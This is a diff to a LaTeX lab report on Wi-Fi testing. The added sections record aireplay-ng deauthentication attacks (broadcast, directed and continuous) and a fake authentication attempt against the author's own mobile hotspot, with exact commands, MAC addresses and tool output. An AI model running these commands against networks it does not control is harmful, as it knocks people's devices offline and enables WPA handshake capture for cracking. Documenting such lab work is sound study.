@@ -257,13 +257,45 @@ sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlp2s0mon
 
 \subsection{Performing a Deauthentication Attack}
 
-A deauthentication attack was performed to force connected clients to reconnect and generate WPA handshake packets:
+A deauthentication attack was performed against an isolated private Wi-Fi access point (a personal mobile hotspot) to force connected clients to reconnect and generate WPA handshake packets. The target was selected because it was under personal control and no third-party devices were affected.
+
+\subsubsection{Broadcast Deauthentication}
+
+An initial broadcast deauthentication attack was sent to all clients associated with the target access point:
 
 \begin{lstlisting}
-sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlp2s0mon
+sudo aireplay-ng -0 5 -a A6:8E:DC:82:EB:7B wlp2s0mon
 \end{lstlisting}
 
-The attack sent deauthentication frames to connected clients, forcing reconnection to the access point.
+This sent five deauthentication frames to the broadcast address, requesting all connected clients to disconnect from the access point.
+
+\subsubsection{Directed Deauthentication}
+
+A directed attack targeting a specific client was then attempted. An initial attempt failed due to a channel mismatch — the monitor interface was locked to a different channel than the access point (channel 6):
+
+\begin{lstlisting}
+sudo aireplay-ng -0 5 -a A6:8E:DC:82:EB:7B -c 14:5A:FC:81:7E:1D wlp2s0mon
+# wlp2s0mon is on channel 13, but the AP uses channel 6
+\end{lstlisting}
+
+Running \texttt{airmon-ng check kill} resolved the channel lock issue. A subsequent directed deauthentication against client \texttt{24:EB:16:56:E1:CC} succeeded, confirmed by the ACK counts reported by \texttt{aireplay-ng}:
+
+\begin{lstlisting}
+sudo aireplay-ng -0 5 -a A6:8E:DC:82:EB:7B -c 24:EB:16:56:E1:CC wlp2s0mon
+# 12:46:10  Sending 64 directed DeAuth (code 7). STMAC: [24:EB:16:56:E1:CC] [63|67 ACKs]
+\end{lstlisting}
+
+A continuous attack (\texttt{-0 0}) was then run for approximately five minutes to observe sustained deauthentication behaviour. ACK counts varied across packets, indicating intermittent reconnection attempts by the client.
+
+\subsubsection{Fake Authentication Attempt}
+
+A fake authentication request was also sent to the access point to test association behaviour:
+
+\begin{lstlisting}
+sudo aireplay-ng -1 0 -a A6:8E:DC:82:EB:7B -c 24:EB:16:56:E1:CC wlp2s0mon
+\end{lstlisting}
+
+The open-system authentication succeeded, but the subsequent association request was denied with status code 12 (\emph{wrong ESSID or WPA}), confirming that WPA2 protection was enforced and association without valid credentials was not possible.
 
 \subsection{Capturing the WPA Handshake}
 
